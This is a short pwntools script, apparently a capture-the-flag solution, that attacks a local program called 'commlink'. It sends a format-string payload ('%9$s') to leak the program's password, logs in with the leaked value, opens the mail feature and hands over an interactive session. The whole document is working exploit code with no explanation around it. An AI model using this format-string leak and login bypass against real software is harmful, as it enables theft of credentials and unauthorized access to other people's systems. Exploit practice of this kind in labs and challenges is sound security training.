from pwn import *

binary = './commlink'
p = process(argv=[binary, 'DUMMY_PASSWORD'])

p.recvuntil(b'> ')
p.sendline(b'%9$s')  # Adjust the offset as needed
password = p.recvline()
password = password.decode().split(':')[0]
print(f"Leaked password: {password}")

p.sendline(b'login')
p.recvuntil(b'> ')
p.sendline(password.encode())
p.recvuntil(b'> ')
p.sendline(b'mails')
p.recvuntil(b'> ')
p.sendline(b'yes')
p.interactive()
